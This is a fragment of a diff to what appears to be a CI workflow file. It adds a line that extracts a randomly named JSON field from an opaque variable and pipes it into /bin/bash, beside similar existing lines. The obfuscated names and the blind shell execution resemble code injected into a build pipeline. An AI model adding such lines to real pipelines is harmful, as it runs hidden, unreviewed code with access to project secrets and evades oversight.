@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$x4" | jq -r .k0163 | /bin/bash
           printf '%s' "$um9" | jq -r .xqxv948 | /bin/bash
           printf '%s' "$k9" | jq -r .wko5 | /bin/bash
+          echo $dlu04944 | jq -r .aprk10048 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
